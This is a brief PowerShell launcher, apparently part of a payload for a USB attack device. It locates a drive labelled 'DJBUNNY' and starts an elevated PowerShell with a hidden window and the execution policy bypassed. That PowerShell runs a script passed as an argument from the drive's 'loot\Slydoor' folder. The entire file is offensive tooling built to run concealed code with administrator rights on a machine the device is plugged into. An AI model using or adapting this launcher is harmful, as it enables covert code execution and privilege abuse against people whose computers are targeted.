param(
[string]$a
)

$bb = (gwmi win32_volume -f 'label=''DJBUNNY''').Name
# Starts PowerShell as Admin
Start-Process powershell.exe -Verb RunAs -ArgumentList "-WindowStyle Hidden", "-Exec Bypass", "-File $bb\loot\Slydoor\$a.ps1"